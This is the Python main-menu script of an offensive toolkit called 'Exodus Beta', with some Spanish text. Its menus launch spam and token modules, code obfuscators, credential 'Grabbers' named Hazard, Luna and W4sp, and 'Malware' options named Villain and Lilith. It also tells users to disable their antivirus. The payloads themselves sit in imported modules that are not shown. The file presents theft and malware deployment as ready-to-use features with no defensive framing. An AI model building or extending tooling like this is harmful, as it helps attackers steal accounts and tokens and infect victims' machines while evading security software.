from util.imports import Colors, System, Cursor, Colorate, mixer, query_devices
from util.MixedColors import Colors, MK4, MK5
from util.modules.logintk import Login
from util.modules.any import AnySpam
from util.modules.tokeni import DTI
from util.modules.msn import MSN
from util.banner import b4nn3r

from util.rpc import RPC, Not
from util.x import *
from util.classes import *

#pacman()
x()
RPC()
if str(query_devices()) != "":
    mixer.init()
    mixer.music.load(rce("util/etc/uwu.mp3"))
    mixer.music.play(1)
Not()
Cursor.HideCursor()
def Exodus():
    try:
        while True:
            System.Title(f"Exodus Beta")
            System.Clear()
            System.Size(120, 35)
            b4nn3r()
            CH1 = input(f" {MK4}[{MK5}*{MK4}]{Colors.white} Choice {Colors.red}> {Colors.white}")
            if CH1 == '1':
                MSN()
            elif CH1 == '2':
                DTI()
            elif CH1 == '3':
                AnySpam()
            elif CH1 == '4':
                Login()
            elif CH1 == '5':
                Custom()
            elif CH1 == '6':
                exit()
        
    except (KeyboardInterrupt, EOFError):
        Exodus()

def Custom(): # Custom module
    while True:
        try:
            global X9X
            System.Size(100, 30)
            System.Title(f"Exodus  ^|  Custom")
            System.Clear()
            X9X = r"""
                                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                    ⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀
                                    ⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀
                                    ⠀⠀⠀⠀⢠⣿⣿⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⣿⣿⡄⠀⠀⠀⠀
                                    ⠀⠀⠀⢠⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⡄⠀⠀⠀
                                    ⠀⠀⠀⣾⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣷⠀⠀⠀
                                    ⠀⠀⠀⣿⣿⣿⣿⡄⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⢠⣿⣿⣿⣿⠀⠀⠀
                                    ⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⢀⣾⣿⣿⣿⡿⠀⠀⠀
                                    ⠀⠀⠀⠈⢿⣿⣿⣿⣿⣄⠀⠈⠻⣿⣿⣿⣿⠟⠁⠀⣠⣿⣿⣿⣿⡿⠁⠀⠀⠀
                                    ⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣷⣄⠀⠈⠛⠛⠁⠀⣠⣾⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀
                                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠓⠀⠀⠀⠀⠚⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        """[1:]
            print(Colorate.Vertical(Colors.red_to_purple, (X9X)))
            print(f""" {MK4}[{MK5}1{MK4}]{Colors.white} Obfuscadores
 {MK4}[{MK5}2{MK4}]{Colors.white} Grabbers
 {MK4}[{MK5}3{MK4}]{Colors.white} Malware

 {MK4}[{MK5}4{MK4}]{Colors.white} Menu principal
        """)
    
            XH0 = input(f" {MK4}[{MK5}*{MK4}]{Colors.white} Choice {Colors.red}> {Colors.white}").replace('"','').replace("'","")
            if XH0 == '1':
                Obfuscadores()
            if XH0 == '2':
                Grabbers()
            if XH0 == '3':
                Malware()
            if XH0 == '4':
                Exodus()
    
        except (KeyboardInterrupt, EOFError):
            Custom()
    


def Obfuscadores():
    try:
        System.Title(f"Exodus  ^| Custom  ^| Obfuscadores")
        System.Clear()
        print(Colorate.Vertical(Colors.red_to_purple, (X9X)))
        print(f""" {MK4}[{MK5}1{MK4}]{Colors.white} Blank
 {MK4}[{MK5}2{MK4}]{Colors.white} Hyperion
 {MK4}[{MK5}3{MK4}]{Colors.white} Kramer
 {MK4}[{MK5}4{MK4}]{Colors.white} OldXor
 {MK4}[{MK5}5{MK4}]{Colors.white} Apocalypse

 {MK4}[{MK5}6{MK4}]{Colors.white} Back
        """)

        XH1 = input(f" {MK4}[{MK5}*{MK4}]{Colors.white} Choice {Colors.red}> {Colors.white}")
        if XH1 == '1':
            Blank()
            donelow()
        if XH1 == '2':
            Hyperion()
            donelow()
        if XH1 == '3':
            Kramer()
            donelow()
        if XH1 == '4':
            OldXor()
            donelow()
        if XH1 == '5':
            Apocalypse()
            donelow()
        if XH1 == '6':
            Custom()
    
    except KeyboardInterrupt:
        Obfuscadores()
    except EOFError:
        Obfuscadores()

def Grabbers():
    try:
        System.Title(f"Exodus  ^| Custom  ^| Grabbers")
        System.Clear()
        print(Colorate.Vertical(Colors.red_to_purple, (X9X)))
        print(f""" {MK4}[{MK5}1{MK4}]{Colors.white} Hazard
 {MK4}[{MK5}2{MK4}]{Colors.white} Luna
 {MK4}[{MK5}3{MK4}]{Colors.white} W4sp

 {MK4}[{MK5}4{MK4}]{Colors.white} Back
        """)

        grabber = input(f" {MK4}[{MK5}*{MK4}]{Colors.white} Choice {Colors.red}> {Colors.white}")
        if grabber == '1':
            Hazard()
        if grabber == '2':
            Luna()
        if grabber == '3':
            W4sp()
        
    except (KeyboardInterrupt, EOFError):
        Grabbers()

def Malware():
    try:
        System.Title(f"Exodus  ^| Custom  ^| Grabbers")
        System.Clear()
        print(Colorate.Vertical(Colors.red_to_purple, (X9X)))
        print(f"{MK4}[{MK5}!!!{MK4}] Asegurate de desactivar tu AV, todo es de codigo abierto {MK4}[{MK5}!!!{MK4}]")
        print(f""" {MK4}[{MK5}1{MK4}]{Colors.white} Villain
        {MK4}[{MK5}2{MK4}]{Colors.white} Lilith
        {MK4}[{MK5}3{MK4}]{Colors.white} Back
        """)
        malw = input(f" {MK4}[{MK5}*{MK4}]{Colors.white} Choice {Colors.red}> {Colors.white}")
        if malw == '1':
            Villain()
            donelow()
        if malw == '2':
            Lilith()
            donelow()
        if malw == '3':
            Custom()

    except (KeyboardInterrupt, EOFError):
        Malware()


if meh:
    Exodus()
